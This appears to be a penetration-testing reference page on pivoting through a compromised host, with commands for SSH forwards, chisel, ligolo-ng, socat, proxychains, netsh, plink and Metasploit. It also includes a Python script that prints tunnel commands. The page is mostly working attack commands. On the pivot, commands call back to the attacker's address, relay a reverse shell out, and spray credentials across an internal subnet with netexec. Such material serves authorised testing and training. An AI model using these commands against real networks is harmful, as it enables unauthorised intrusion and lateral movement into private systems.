---
title: "Pivoting and Tunnelling - SSH, chisel, socat, ligolo-ng and proxychains"
category: misc
subcategory: pivoting
type: technique
tags: [pivoting, tunnelling, ssh, port-forwarding, chisel, socat, proxychains, ligolo-ng, sshuttle, socks-proxy, netsh, reverse-tunnel, dynamic-forward, network-services]
difficulty: medium
summary: "Reach networks behind a compromised host: SSH -L/-R/-D, chisel/ligolo reverse SOCKS, socat relays, and proxychains to run your tools through the tunnel."
when_to_use:
  - "You have a shell on a host that can reach a network you cannot"
  - "You need to scan or exploit an internal subnet from your attack box"
  - "A firewall only allows outbound from the compromised host"
  - "You must chain through two or more hops to reach the target"
tools: [ssh, chisel, socat, proxychains, ligolo-ng, sshuttle, netexec]
related: [net-reverse-shells, net-mitm, ad-credential-attacks]
---

## TL;DR

A pivot turns a compromised host into a router into its network. SSH forwarding covers most cases
(`-L` local, `-R` remote, `-D` dynamic SOCKS). When you only have a shell (no SSH), use `chisel` or
`ligolo-ng` for a reverse SOCKS tunnel, `socat` for single-port relays, and `proxychains` to send
your existing tools through the SOCKS proxy.

## Recognise it

- `ip a` / `ipconfig` on the shell shows a second interface or a subnet you cannot reach directly.
- A host resolves internal names or has routes to `10.x`/`172.16.x` you cannot ping from your box.
- Outbound is filtered except for one protocol -- you need to tunnel over what is allowed.

## Attack

### SSH forwarding (when you have SSH creds/keys)

```bash
# LOCAL forward: expose a remote-only service on your local port
#   your:8080 -> (via pivot) -> internal:80
ssh -L 8080:10.10.20.7:80 user@10.10.10.5

# REMOTE forward: expose YOUR local port on the pivot (e.g. bring your handler to them)
#   pivot:9001 -> (back to you) -> your:9001
ssh -R 9001:127.0.0.1:9001 user@10.10.10.5

# DYNAMIC forward: a SOCKS proxy that routes to anything the pivot can reach
ssh -D 1080 user@10.10.10.5

# Background, no shell, all three flags you usually want together
ssh -f -N -D 1080 user@10.10.10.5

# ProxyJump chain (hop through the pivot to an internal host's SSH)
ssh -J user@10.10.10.5 admin@10.10.20.7

# sshuttle: VPN-like, routes a whole subnet over SSH (no proxychains needed)
sshuttle -r user@10.10.10.5 10.10.20.0/24
```

`GatewayPorts` note: `-R` binds to loopback on the pivot by default; to expose it on all pivot
interfaces the pivot's sshd needs `GatewayPorts yes` (or `clientspecified`).

### chisel (when you only have a shell)

chisel tunnels SOCKS/ports over HTTP. Run the server on your box, the client on the pivot.

```bash
# On YOUR box: chisel server in reverse mode
./chisel server --reverse --port 8000

# On the PIVOT: connect back and open a reverse SOCKS proxy on your box's :1080
./chisel client YOUR_IP:8000 R:1080:socks

# Reverse single-port forward: pivot reaches internal:3306, exposed on your :3306
./chisel client YOUR_IP:8000 R:3306:10.10.20.7:3306

# Forward mode (you connect out to a chisel server on the pivot)
./chisel client 10.10.10.5:8000 1080:socks
```

After `R:1080:socks`, set proxychains to `socks5 127.0.0.1 1080`.

### ligolo-ng (clean userland tun interface, no proxychains)

```bash
# On YOUR box: start the proxy with a self-signed cert and a listener
./proxy -selfcert -laddr 0.0.0.0:11601

# Create and bring up the tun interface (one-time, on your box)
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

# On the PIVOT: connect the agent back to you
./agent -connect YOUR_IP:11601 -ignore-cert

# In the ligolo proxy console: pick the session, then route the internal subnet through it
#   session
#   ifconfig            (see the agent's networks)
# On your box, add the route so traffic to the subnet uses the ligolo tun:
sudo ip route add 10.10.20.0/24 dev ligolo
# Back in the proxy console:
#   start
```

With ligolo the internal subnet is reachable natively -- `nmap`, browsers and exploits work without
proxychains.

### socat relays

```bash
# Simple TCP port forwarder on the pivot: pivot:8080 -> internal:80
socat TCP-LISTEN:8080,fork,reuseaddr TCP:10.10.20.7:80

# Relay a reverse shell through the pivot to your listener
socat TCP-LISTEN:9001,fork TCP:YOUR_IP:9001

# Encrypted relay (openssl) when you need the hop protected
socat OPENSSL-LISTEN:8443,cert=cert.pem,verify=0,fork TCP:10.10.20.7:80
```

### proxychains configuration

```bash
# /etc/proxychains4.conf -- pick ONE chain mode, set the SOCKS port
#   strict_chain      # use every proxy in order (fail if one is down)
#   dynamic_chain     # skip dead proxies (best for shaky pivots)
# and under [ProxyList]:
#   socks5 127.0.0.1 1080

# Run a tool through the tunnel
proxychains -q nmap -sT -Pn -n -p 22,80,445 10.10.20.7
proxychains -q netexec smb 10.10.20.0/24 -u jdoe -p 'Summer2024!'
proxychains -q curl http://10.10.20.7/
```

proxychains + nmap must use `-sT -Pn` (TCP connect; SYN scans and OS/UDP do not traverse SOCKS).
Comment out `proxy_dns` if DNS through the proxy hangs.

### Windows-side pivots

```cmd
:: netsh portproxy: forward pivot:8080 to an internal host (persists, needs admin)
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=10.10.20.7

:: show / delete the rule
netsh interface portproxy show all
netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0
```

```bash
# plink (PuTTY CLI) reverse forward from a Windows pivot back to your SSH
plink.exe -ssh -R 3306:10.10.20.7:3306 user@YOUR_IP -pw password
```

### Metasploit pivot (when you already have a meterpreter session)

```
# Add a route to the internal subnet via the session, then start a SOCKS proxy
run autoroute -s 10.10.20.0/24
use auxiliary/server/socks_proxy
set SRVPORT 1080
set VERSION 5
run
```

### Double pivot

Layer tunnels: pivot A gives you SOCKS to subnet B; a host in B is pivot B giving SOCKS to subnet C.
With chisel, run a second chisel client on pivot B pointing at a chisel server you exposed *through*
the first tunnel; with ligolo, add a second agent and a second route. Keep a diagram -- the port
bookkeeping is where mistakes happen.

## Code

Pivot cheat-planner: given "I am on HOST which can reach TARGET:PORT", print the exact commands for
each tunnelling method so you do not misremember the `-L`/`-R` direction.

```python
#!/usr/bin/env python3
"""Emit the exact tunnel commands for a given pivot scenario.

Usage:
    python3 pivot_plan.py <pivot_ip> <internal_ip> <internal_port> <your_ip>
"""
from __future__ import annotations

import sys


def plan(pivot: str, target: str, port: str, me: str) -> None:
    """Print SSH/chisel/socat/ligolo commands for reaching target:port via pivot."""
    lport = "1" + port if len(port) < 5 else port
    print(f"# Goal: reach {target}:{port} which only {pivot} can talk to\n")

    print("## SSH local forward (you have SSH to the pivot)")
    print(f"ssh -f -N -L {lport}:{target}:{port} user@{pivot}")
    print(f"# then use 127.0.0.1:{lport} on your box\n")

    print("## SSH dynamic SOCKS (reach the whole internal net)")
    print(f"ssh -f -N -D 1080 user@{pivot}")
    print("# proxychains socks5 127.0.0.1 1080\n")

    print("## chisel reverse SOCKS (you only have a shell on the pivot)")
    print(f"# on you:    ./chisel server --reverse --port 8000")
    print(f"# on pivot:  ./chisel client {me}:8000 R:1080:socks\n")

    print("## chisel reverse single port")
    print(f"# on pivot:  ./chisel client {me}:8000 R:{lport}:{target}:{port}\n")

    print("## socat relay on the pivot")
    print(f"socat TCP-LISTEN:{lport},fork,reuseaddr TCP:{target}:{port}")
    print(f"# then hit {pivot}:{lport}\n")

    print("## ligolo-ng (native routing)")
    print(f"# on you:    ./proxy -selfcert -laddr 0.0.0.0:11601")
    print(f"# on pivot:  ./agent -connect {me}:11601 -ignore-cert")
    print(f"# on you:    sudo ip route add {target}/32 dev ligolo   (then 'start' in console)")


def main(argv: list[str]) -> int:
    if len(argv) != 5:
        print(__doc__)
        return 1
    plan(argv[1], argv[2], argv[3], argv[4])
    return 0


if __name__ == "__main__":
    raise SystemExit(main(sys.argv))
```

## Variants & pitfalls

- **`-L` vs `-R` direction** is the classic confusion. `-L` pulls a remote service to your local
  port; `-R` pushes your local service out to the remote side. Say the sentence out loud.
- **SOCKS carries TCP only.** UDP (DNS, SNMP) does not traverse a SOCKS proxy -- use ligolo/sshuttle
  or a dedicated UDP relay.
- **nmap through proxychains** must be `-sT -Pn`; SYN, OS detection and UDP silently fail.
- **Bind failures** ("Address already in use") mean the local port is taken -- pick another.
- **`-R` binds to loopback** on the pivot unless sshd has `GatewayPorts yes`.
- **MTU/latency.** Nested tunnels get slow and fragile; prefer ligolo's tun for heavy tools.
- **Static binaries.** Match chisel/ligolo/socat architecture (amd64 vs arm) to the pivot and use
  static builds -- the target may lack libc versions.
- **Clean up.** Remove `netsh portproxy` rules and kill background ssh/chisel when done.

## Tools

- `ssh` (`-L/-R/-D/-J`), `sshuttle` -- when you have SSH access.
- `chisel` -- reverse SOCKS/port tunnel over HTTP; single static binary.
- `ligolo-ng` -- userland tun interface; native routing, no proxychains.
- `socat` -- single-port relays, TLS-wrapped hops.
- `proxychains4` -- route existing tools through a SOCKS proxy.
- `netsh`, `plink` -- Windows pivots.

## References

- `man ssh` (the `-L`, `-R`, `-D`, `-J` and `GatewayPorts` sections).
- The chisel and ligolo-ng README files shipped with each tool.
- `man proxychains4` for chain modes and `proxy_dns`.
